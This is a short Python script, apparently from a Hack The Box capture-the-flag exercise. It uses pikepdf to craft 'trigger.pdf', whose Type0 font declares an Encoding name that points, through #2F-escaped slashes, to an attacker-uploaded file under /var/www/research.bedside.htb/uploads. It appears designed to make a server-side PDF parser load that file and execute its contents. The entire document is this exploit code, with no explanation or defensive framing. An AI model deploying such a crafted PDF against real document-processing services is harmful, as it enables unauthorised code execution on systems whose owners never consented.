# make_trigger_pdf.py
import pikepdf
from pikepdf import Dictionary, Name, Array

pdf = pikepdf.new()
page = pdf.add_blank_page(page_size=(612, 792))

descriptor = pdf.make_indirect(Dictionary(
    Type=Name.FontDescriptor,
    FontName=Name.MaliciousFont,
    Flags=4,
    FontBBox=Array([-1000, -1000, 1000, 1000]),
    ItalicAngle=0,
    Ascent=1000,
    Descent=-200,
    CapHeight=800,
    StemV=80,
))

descendant = pdf.make_indirect(Dictionary(
    Type=Name.Font,
    Subtype=Name.CIDFontType2,
    BaseFont=Name.MaliciousFont,
    CIDSystemInfo=Dictionary(Registry="Adobe", Ordering="Identity", Supplement=0),
    FontDescriptor=descriptor,
))

abs_path_name = "/var/www/research.bedside.htb/uploads/evil"
encoded = "/" + abs_path_name.replace("/", "#2F")   # NO lstrip here

font = pdf.make_indirect(Dictionary(
    Type=Name.Font,
    Subtype=Name.Type0,
    BaseFont=Name("/MaliciousFont-Identity-H"),
    Encoding=Name(encoded),
    DescendantFonts=Array([descendant]),
))

page.Resources = Dictionary(Font=Dictionary(F1=font))
page.Contents = pdf.make_stream(b"BT /F1 12 Tf 100 700 Td (Trigger PDF) Tj ET")

pdf.save("trigger.pdf")
print("Created trigger.pdf")
